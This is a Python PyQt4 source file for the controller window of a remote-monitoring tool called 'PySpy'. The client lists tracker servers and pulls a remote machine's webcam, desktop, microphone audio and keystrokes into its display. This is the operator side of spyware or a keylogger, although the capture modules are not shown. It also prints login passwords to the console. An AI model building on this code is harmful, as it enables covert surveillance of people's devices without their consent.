# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'pyspy_window.ui'
#
# Created: Sun Jun 14 08:28:41 2015
#	  by: PyQt4 UI code generator 4.11.3
#
# WARNING! All changes made in this file will be lost!

from PyQt4 import QtCore, QtGui
from PyQt4.QtCore import *
from PyQt4.QtGui import *
import json, time
from socket import *
from manager import *
from image import *
from pysocket import *
import sys,os
from database import User
from threading import Thread
from threads import *


from login_ui import Ui_Login
from listen_servers_ui import Ui_ListServers

try:
	_fromUtf8 = QtCore.QString.fromUtf8
except AttributeError:
	def _fromUtf8(s):
		return s

SAVEDIR = os.path.dirname(os.path.abspath(__file__)) + "/temp/"	

try:
	_encoding = QtGui.QApplication.UnicodeUTF8
	def _translate(context, text, disambig):
		return QtGui.QApplication.translate(context, text, disambig, _encoding)
except AttributeError:
	def _translate(context, text, disambig):
		return QtGui.QApplication.translate(context, text, disambig)

class Client(QtGui.QMainWindow):
	__login = None
	__list_servers = None
	__addressTracker = None
	__server_connected = None 
	__keyAuthetication = None
	__manager = None
	__pysocket = None
	__user = None
	def __init__(self,addressTracker):
		self.__addressTracker = addressTracker
		self.__pysocket = Pysocket()
		self.__user = User("name", "username", "password")
		self.__manager = Manager(self.__user)
	
		QtGui.QMainWindow.__init__(self)
		self.setupUi(self)
		
	def setupUi(self, MainWindow):
		MainWindow.setObjectName(_fromUtf8("MainWindow"))
		MainWindow.resize(978, 495)
		self.centralwidget = QtGui.QWidget(MainWindow)
		self.centralwidget.setObjectName(_fromUtf8("centralwidget"))
		self.verticalLayout_7 = QtGui.QVBoxLayout(self.centralwidget)
		self.verticalLayout_7.setObjectName(_fromUtf8("verticalLayout_7"))
		self.verticalLayout_6 = QtGui.QVBoxLayout()
		self.verticalLayout_6.setObjectName(_fromUtf8("verticalLayout_6"))
		self.horizontalLayout_7 = QtGui.QHBoxLayout()
		self.horizontalLayout_7.setObjectName(_fromUtf8("horizontalLayout_7"))
		self.qImage = QtGui.QGraphicsView(self.centralwidget)
		self.qImage.setObjectName(_fromUtf8("qImage"))
		self.horizontalLayout_7.addWidget(self.qImage)
		self.qDesktop = QtGui.QGraphicsView(self.centralwidget)
		self.qDesktop.setObjectName(_fromUtf8("qDesktop"))
		self.horizontalLayout_7.addWidget(self.qDesktop)
		self.verticalLayout_6.addLayout(self.horizontalLayout_7)
		self.keyboard = QtGui.QLineEdit(self.centralwidget)
		self.keyboard.setObjectName(_fromUtf8("keyboard"))
		self.verticalLayout_6.addWidget(self.keyboard)
		self.horizontalLayout_6 = QtGui.QHBoxLayout()
		self.horizontalLayout_6.setObjectName(_fromUtf8("horizontalLayout_6"))
		self.verticalLayout_5 = QtGui.QVBoxLayout()
		self.verticalLayout_5.setObjectName(_fromUtf8("verticalLayout_5"))
		self.label_5 = QtGui.QLabel(self.centralwidget)
		self.label_5.setScaledContents(False)
		self.label_5.setAlignment(QtCore.Qt.AlignCenter)
		self.label_5.setObjectName(_fromUtf8("label_5"))
		self.verticalLayout_5.addWidget(self.label_5)
		self.horizontalLayout_5 = QtGui.QHBoxLayout()
		self.horizontalLayout_5.setObjectName(_fromUtf8("horizontalLayout_5"))
		self.Login = QtGui.QPushButton(self.centralwidget)
		self.Login.setCheckable(False)
		self.Login.setObjectName(_fromUtf8("Login"))
		self.horizontalLayout_5.addWidget(self.Login)
		self.ConnectServer = QtGui.QPushButton(self.centralwidget)
		self.ConnectServer.setObjectName(_fromUtf8("ConnectServer"))
		self.horizontalLayout_5.addWidget(self.ConnectServer)
		self.verticalLayout_5.addLayout(self.horizontalLayout_5)
		self.horizontalLayout_6.addLayout(self.verticalLayout_5)
		self.verticalLayout = QtGui.QVBoxLayout()
		self.verticalLayout.setObjectName(_fromUtf8("verticalLayout"))
		self.label = QtGui.QLabel(self.centralwidget)
		self.label.setScaledContents(False)
		self.label.setAlignment(QtCore.Qt.AlignCenter)
		self.label.setObjectName(_fromUtf8("label"))
		self.verticalLayout.addWidget(self.label)
		self.horizontalLayout = QtGui.QHBoxLayout()
		self.horizontalLayout.setObjectName(_fromUtf8("horizontalLayout"))
		self.connectWebCam = QtGui.QPushButton(self.centralwidget)
		self.connectWebCam.setCheckable(False)
		self.connectWebCam.setObjectName(_fromUtf8("connectWebCam"))
		self.horizontalLayout.addWidget(self.connectWebCam)
		self.disconnectWebCam = QtGui.QPushButton(self.centralwidget)
		self.disconnectWebCam.setObjectName(_fromUtf8("disconnectWebCam"))
		self.horizontalLayout.addWidget(self.disconnectWebCam)
		self.verticalLayout.addLayout(self.horizontalLayout)
		self.horizontalLayout_6.addLayout(self.verticalLayout)
		self.verticalLayout_2 = QtGui.QVBoxLayout()
		self.verticalLayout_2.setObjectName(_fromUtf8("verticalLayout_2"))
		self.label_2 = QtGui.QLabel(self.centralwidget)
		self.label_2.setScaledContents(False)
		self.label_2.setAlignment(QtCore.Qt.AlignCenter)
		self.label_2.setObjectName(_fromUtf8("label_2"))
		self.verticalLayout_2.addWidget(self.label_2)
		self.horizontalLayout_2 = QtGui.QHBoxLayout()
		self.horizontalLayout_2.setObjectName(_fromUtf8("horizontalLayout_2"))
		self.connectDesktop = QtGui.QPushButton(self.centralwidget)
		self.connectDesktop.setCheckable(False)
		self.connectDesktop.setObjectName(_fromUtf8("connectDesktop"))
		self.horizontalLayout_2.addWidget(self.connectDesktop)
		self.disconnectDesktop = QtGui.QPushButton(self.centralwidget)
		self.disconnectDesktop.setObjectName(_fromUtf8("disconnectDesktop"))
		self.horizontalLayout_2.addWidget(self.disconnectDesktop)
		self.verticalLayout_2.addLayout(self.horizontalLayout_2)
		self.horizontalLayout_6.addLayout(self.verticalLayout_2)
		self.verticalLayout_3 = QtGui.QVBoxLayout()
		self.verticalLayout_3.setObjectName(_fromUtf8("verticalLayout_3"))
		self.label_3 = QtGui.QLabel(self.centralwidget)
		self.label_3.setScaledContents(False)
		self.label_3.setAlignment(QtCore.Qt.AlignCenter)
		self.label_3.setObjectName(_fromUtf8("label_3"))
		self.verticalLayout_3.addWidget(self.label_3)
		self.horizontalLayout_3 = QtGui.QHBoxLayout()
		self.horizontalLayout_3.setObjectName(_fromUtf8("horizontalLayout_3"))
		self.connectAudio = QtGui.QPushButton(self.centralwidget)
		self.connectAudio.setCheckable(False)
		self.connectAudio.setObjectName(_fromUtf8("connectAudio"))
		self.horizontalLayout_3.addWidget(self.connectAudio)
		self.disconnectAudio = QtGui.QPushButton(self.centralwidget)
		self.disconnectAudio.setObjectName(_fromUtf8("disconnectAudio"))
		self.horizontalLayout_3.addWidget(self.disconnectAudio)
		self.verticalLayout_3.addLayout(self.horizontalLayout_3)
		self.horizontalLayout_6.addLayout(self.verticalLayout_3)
		self.verticalLayout_4 = QtGui.QVBoxLayout()
		self.verticalLayout_4.setObjectName(_fromUtf8("verticalLayout_4"))
		self.label_4 = QtGui.QLabel(self.centralwidget)
		self.label_4.setScaledContents(False)
		self.label_4.setAlignment(QtCore.Qt.AlignCenter)
		self.label_4.setObjectName(_fromUtf8("label_4"))
		self.verticalLayout_4.addWidget(self.label_4)
		self.horizontalLayout_4 = QtGui.QHBoxLayout()
		self.horizontalLayout_4.setObjectName(_fromUtf8("horizontalLayout_4"))
		self.connectKeyboard = QtGui.QPushButton(self.centralwidget)
		self.connectKeyboard.setCheckable(False)
		self.connectKeyboard.setObjectName(_fromUtf8("connectKeyboard"))
		self.horizontalLayout_4.addWidget(self.connectKeyboard)
		self.disconnectKeyboard = QtGui.QPushButton(self.centralwidget)
		self.disconnectKeyboard.setObjectName(_fromUtf8("disconnectKeyboard"))
		self.horizontalLayout_4.addWidget(self.disconnectKeyboard)
		self.verticalLayout_4.addLayout(self.horizontalLayout_4)
		self.horizontalLayout_6.addLayout(self.verticalLayout_4)
		self.verticalLayout_6.addLayout(self.horizontalLayout_6)
		self.verticalLayout_7.addLayout(self.verticalLayout_6)
		MainWindow.setCentralWidget(self.centralwidget)
		self.menubar = QtGui.QMenuBar(MainWindow)
		self.menubar.setGeometry(QtCore.QRect(0, 0, 978, 25))
		self.menubar.setObjectName(_fromUtf8("menubar"))
		self.menuMenu = QtGui.QMenu(self.menubar)
		self.menuMenu.setObjectName(_fromUtf8("menuMenu"))
		MainWindow.setMenuBar(self.menubar)
		self.statusbar = QtGui.QStatusBar(MainWindow)
		self.statusbar.setObjectName(_fromUtf8("statusbar"))
		MainWindow.setStatusBar(self.statusbar)
		self.btnConnectServer = QtGui.QAction(MainWindow)
		self.btnConnectServer.setObjectName(_fromUtf8("btnConnectServer"))
		self.btnLogin = QtGui.QAction(MainWindow)
		self.btnLogin.setObjectName(_fromUtf8("btnLogin"))
		self.btnConnectWebCam = QtGui.QAction(MainWindow)
		self.btnConnectWebCam.setObjectName(_fromUtf8("btnConnectWebCam"))
		self.btnConnectMicrophone = QtGui.QAction(MainWindow)
		self.btnConnectMicrophone.setObjectName(_fromUtf8("btnConnectMicrophone"))
		self.btnConnectDesktop = QtGui.QAction(MainWindow)
		self.btnConnectDesktop.setObjectName(_fromUtf8("btnConnectDesktop"))
		self.btnDisconnectWebCam = QtGui.QAction(MainWindow)
		self.btnDisconnectWebCam.setObjectName(_fromUtf8("btnDisconnectWebCam"))
		self.btnDisconnectMicrophone = QtGui.QAction(MainWindow)
		self.btnDisconnectMicrophone.setObjectName(_fromUtf8("btnDisconnectMicrophone"))
		self.btnDisconnectDesktop = QtGui.QAction(MainWindow)
		self.btnDisconnectDesktop.setObjectName(_fromUtf8("btnDisconnectDesktop"))
		self.btnConnectKeyboard = QtGui.QAction(MainWindow)
		self.btnConnectKeyboard.setObjectName(_fromUtf8("btnConnectKeyboard"))
		self.btnDisconnectKeyboard = QtGui.QAction(MainWindow)
		self.btnDisconnectKeyboard.setObjectName(_fromUtf8("btnDisconnectKeyboard"))
		self.btnClose = QtGui.QAction(MainWindow)
		self.btnClose.setObjectName(_fromUtf8("btnClose"))
		self.actionSair = QtGui.QAction(MainWindow)
		self.actionSair.setObjectName(_fromUtf8("actionSair"))
		self.menuMenu.addAction(self.actionSair)
		self.menubar.addAction(self.menuMenu.menuAction())

		self.retranslateUi(MainWindow)
		QtCore.QMetaObject.connectSlotsByName(MainWindow)


	def retranslateUi(self, MainWindow):
		MainWindow.setWindowTitle(_translate("MainWindow", "PySpy", None))
		self.label_5.setText(_translate("MainWindow", "Servers", None))
		self.Login.setText(_translate("MainWindow", "Login", None))
		self.ConnectServer.setText(_translate("MainWindow", "Connect", None))
		self.label.setText(_translate("MainWindow", "WebCam", None))
		self.connectWebCam.setText(_translate("MainWindow", "Connect", None))
		self.disconnectWebCam.setText(_translate("MainWindow", "Disconnect", None))
		self.label_2.setText(_translate("MainWindow", "Desktop", None))
		self.connectDesktop.setText(_translate("MainWindow", "Connect", None))
		self.disconnectDesktop.setText(_translate("MainWindow", "Disconnect", None))
		self.label_3.setText(_translate("MainWindow", "Audio", None))
		self.connectAudio.setText(_translate("MainWindow", "Connect", None))
		self.disconnectAudio.setText(_translate("MainWindow", "Disconnect", None))
		self.label_4.setText(_translate("MainWindow", "Keyboard", None))
		self.connectKeyboard.setText(_translate("MainWindow", "Connect", None))
		self.disconnectKeyboard.setText(_translate("MainWindow", "Disconnect", None))
		self.menuMenu.setTitle(_translate("MainWindow", "Menu", None))
		self.btnConnectServer.setText(_translate("MainWindow", "Connect in Server", None))
		self.btnLogin.setText(_translate("MainWindow", "Login", None))
		self.btnConnectWebCam.setText(_translate("MainWindow", "Connect", None))
		self.btnConnectMicrophone.setText(_translate("MainWindow", "Connect", None))
		self.btnConnectDesktop.setText(_translate("MainWindow", "Connect", None))
		self.btnDisconnectWebCam.setText(_translate("MainWindow", "Disconnect", None))
		self.btnDisconnectMicrophone.setText(_translate("MainWindow", "Disconnect", None))
		self.btnDisconnectDesktop.setText(_translate("MainWindow", "Disconnect", None))
		self.btnConnectKeyboard.setText(_translate("MainWindow", "Connect", None))
		self.btnDisconnectKeyboard.setText(_translate("MainWindow", "Disconnect", None))
		self.btnClose.setText(_translate("MainWindow", "Close", None))
		self.actionSair.setText(_translate("MainWindow", "Sair", None))

		#Signals
		
		QtCore.QObject.connect(self.Login, QtCore.SIGNAL(_fromUtf8("clicked()")), self.login)
		QtCore.QObject.connect(self.ConnectServer, QtCore.SIGNAL(_fromUtf8("clicked()")), self.connectInServer)
		
		#Requests
		QtCore.QObject.connect(self.connectWebCam, QtCore.SIGNAL(_fromUtf8("clicked()")), self.requestImage)
		QtCore.QObject.connect(self.connectDesktop, QtCore.SIGNAL(_fromUtf8("clicked()")), self.requestDisplay)
		QtCore.QObject.connect(self.connectAudio, QtCore.SIGNAL(_fromUtf8("clicked()")), self.requestAudio)
		QtCore.QObject.connect(self.connectKeyboard, QtCore.SIGNAL(_fromUtf8("clicked()")), self.requestKeyboard)
	
	
	#LOGIN
	def login(self):
		self.__login = Ui_Login(self)
		self.__login.show()
		QtCore.QObject.connect(self.__login, QtCore.SIGNAL(_fromUtf8("accepted()")), self.loginInput)

	def loginInput(self):
		username =  self.__login.username.text()
		password =  self.__login.password.text()
		print "Username: ", username, " Password: ", password
		if not username or not password:
			print "Erro Login..."
			return
		self.__user = User("default", username, password)
		self.__manager = Manager(self.__user)
	
	
	#CONNECT IN SERVER
	def connectInServer(self):
		self.__list_servers = Ui_ListServers()
		servers = self.listServer()
		for i in self.listServer():
			self.__list_servers.add(str(i[0])+":"+str(i[1]))
		self.__list_servers.show()
		QtCore.QObject.connect(self.__list_servers, QtCore.SIGNAL(_fromUtf8("accepted()")), self.connectInServerInput)
		
	def connectInServerInput(self):
		item = self.__list_servers.getItem()
		text = item.text()
		if not text:
			print "No Server Selected!!!"
			return
		text = text.split(":")
		self.__server_connected=( text[0],int(text[1]) )
		print "Server Connected..."
	
	def listServer(self):
		data = json.dumps({'type': 2, 'code': 0, 'status': 'OK'})
		sock = socket(AF_INET, SOCK_STREAM)
		sock.connect(self.__addressTracker)
		sock.sendall(data)
		try:
			response = json.loads(self.__pysocket.recvall(sock))['servers']
		except:
			return None
		return response

	def requestImage(self):
		t = UpdateImage(self.__server_connected, self.__manager, self)
		QtCore.QObject.connect(t, QtCore.SIGNAL(_fromUtf8("update()")), self.streamImage)
		t.start()
		
	def streamImage(self):
		self.setImageWebCam(SAVEDIR + 'image.jpg')
	def requestDisplay(self):
		t = UpdateDesktop(self.__server_connected, self.__manager, self)
		QtCore.QObject.connect(t, QtCore.SIGNAL(_fromUtf8("update()")), self.streamDisplay)
		t.start()
		
	def streamDisplay(self):
		self.setImageDesktop(SAVEDIR + 'display.png')
		
	def requestAudio(self, size = 1024):
		t = UpdateAudio(self.__server_connected,size,  self.__manager, self)
		QtCore.QObject.connect(t, QtCore.SIGNAL(_fromUtf8("update()")), self.streamAudio)
		t.start()
		
	def streamAudio(self):
		t = PlayAudio(SAVEDIR + 'audio.wav', self)
		t.start()
		
	def requestKeyboard(self, size = 40):
		open(SAVEDIR + "keys.txt", "w")
		t = UpdateKeyboard(self.__server_connected,size , self.__manager, self)
		QtCore.QObject.connect(t, QtCore.SIGNAL(_fromUtf8("update()")), self.streamKeyboard)
		t.start()
		
	def streamKeyboard(self):
		self.keyboard.setText(open(SAVEDIR + "keys.txt", "r").read())
	
	def setImageWebCam(self, path):
		scene = QGraphicsScene()
		scene.addPixmap(QPixmap(path))
		self.qImage.setScene(scene)
		
	def setImageDesktop(self, path):
		scene = QGraphicsScene()
		scene.addPixmap(QPixmap(path))
		self.qDesktop.setScene(scene)
